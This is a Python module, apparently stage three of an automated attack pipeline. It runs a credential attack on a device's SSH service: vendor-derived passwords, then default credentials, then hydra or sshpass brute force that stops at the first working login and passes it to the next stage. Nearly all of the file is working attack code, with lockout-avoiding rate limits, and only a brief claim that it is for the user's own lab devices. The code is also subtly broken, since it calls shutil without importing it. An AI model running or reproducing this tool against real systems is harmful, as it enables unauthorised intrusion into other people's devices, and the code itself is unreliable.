"""Stage 3 — credential attack (EXECUTE, not just plan).

Realistic flow against a device whose password we do NOT know:
    derive  ->  defaults  ->  brute (hydra, sshpass fallback)
Stops at the first credential that actually logs in, then hands it to Stage 4.

Every login attempt is a real SSH auth; we verify by running `id` and checking
for uid=. Lockout-aware: small wordlists, low parallelism, --first-found.

The brute arm is a credential-strength check for your OWN lab devices only —
rate-limited (hydra -t<=4 / sshpass single-stream, first-found) to detect
default/weak-credential weakness without locking the account. Engine order:
hydra (primary, if installed) -> sshpass sweep (fallback).
"""
from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass, field

from . import creds as creds_mod
from . import ssh

# Single source of truth for the wordlists (shared with creds.py).
USERLIST = creds_mod.USERLIST
PASSLIST = creds_mod.PASSLIST

@dataclass
class AttackResult:
    host: str
    port: int = 22
    found: bool = False
    user: str | None = None
    password: str | None = None
    via: str | None = None            # derive | default | brute
    attempts: int = 0
    tried: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
def ssh_login(host: str, user: str, password: str, port: int = 22,
              timeout: int = 15) -> bool:
    """One real SSH login attempt. True iff we got a shell (uid= in `id`)."""
    return ssh.login_ok(host, user, password, port, timeout)


def _verify_list(host, port, pairs, res: AttackResult, via: str):
    for user, pw in pairs:
        res.attempts += 1
        res.tried.append(f"user={user}; credential=redacted")
        if ssh_login(host, user, pw, port):
            res.found, res.user, res.password, res.via = True, user, pw, via
            res.notes.append(f"valid credential confirmed via {via} for user {user}")
            return True
    return False


# ---------------------------------------------------------------------------
def hydra_available() -> bool:
    return shutil.which("hydra") is not None


def hydra_brute(host, port, userlist, passlist, res: AttackResult,
                tasks=4, timeout=600):
    """Primary brute engine: run hydra against SSH. Return (user, pw) or None.

    Uses the SAME command builder as the plan in creds.py so the two can't
    drift. Rate-limit safety: tasks<=4 (low parallelism) and -f (stop at first
    valid credential). TimeoutExpired/OSError are caught and noted — on any
    failure we return None so the caller can fall back to sshpass.
    """
    tasks = min(tasks, 4)  # hard cap: don't hammer the device (anti-lockout)
    cmd = creds_mod.build_hydra_cmd(host, port, "ssh", userlist, passlist, tasks)
    res.notes.append("brute engine: hydra -> " + " ".join(cmd))
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        res.notes.append(f"hydra timed out after {timeout}s — falling back to sshpass")
        return None
    except OSError as e:
        res.notes.append(f"hydra failed to start ({type(e).__name__}: {e}) — falling back to sshpass")
        return None
    try:
        res.attempts += len(_read(userlist)) * len(_read(passlist))
    except OSError:
        pass
    m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", p.stdout)
    if m:
        return m.group(1), m.group(2)
    res.notes.append("hydra found no valid credential in the wordlists")
    return None


def sshpass_brute(host, port, userlist, passlist, res: AttackResult):
    """Fallback brute when hydra is absent: nested sshpass sweep."""
    users = _read(userlist)
    pws = _read(passlist)
    pairs = [(u, pw) for u in users for pw in pws]
    return _verify_list(host, port, pairs, res, "brute")


def _read(path):
    with open(path) as f:
        return [ln.strip() for ln in f if ln.strip()]


# ---------------------------------------------------------------------------
def attack(host: str, port: int = 22, vendor: str | None = None,
           serial: str | None = None, userlist: str = USERLIST,
           passlist: str = PASSLIST, use_brute: bool = True) -> AttackResult:
    res = AttackResult(host=host, port=port)

    # 1) derive (vendor-specific, deterministic, no lockout)
    plan = creds_mod.plan(host, port, vendor=vendor, serial=serial)
    derived_pairs = [(u, pw) for pw in plan.derived for u in ("supervisor", "root", "admin")]
    if derived_pairs and _verify_list(host, port, derived_pairs, res, "derive"):
        return res
    if plan.derived:
        res.notes.append("derived candidates did not authenticate")
    elif vendor and vendor.lower() == "zyxel":
        res.notes.append("no derived candidate yet (serial unknown / keygen unvalidated)")

    # 2) default / known creds
    if _verify_list(host, port, creds_mod.DEFAULT_CREDS, res, "default"):
        return res

    # 3) brute force (last resort) — hydra primary, sshpass fallback.
    if use_brute:
        if hydra_available():
            hit = hydra_brute(host, port, userlist, passlist, res)
            if hit:
                res.found, res.user, res.password, res.via = True, hit[0], hit[1], "brute-hydra"
                res.notes.append(
                    f"valid credential confirmed via brute-hydra for user {hit[0]}"
                )
                return res
        else:
            res.notes.append("hydra not installed — using sshpass fallback "
                             "(`sudo apt install hydra` to enable the primary engine)")
        # hydra absent / errored / no hit -> sshpass fallback (behavior unchanged)
        if sshpass_brute(host, port, userlist, passlist, res):
            return res

    res.notes.append("no valid credential found with current wordlists")
    return res
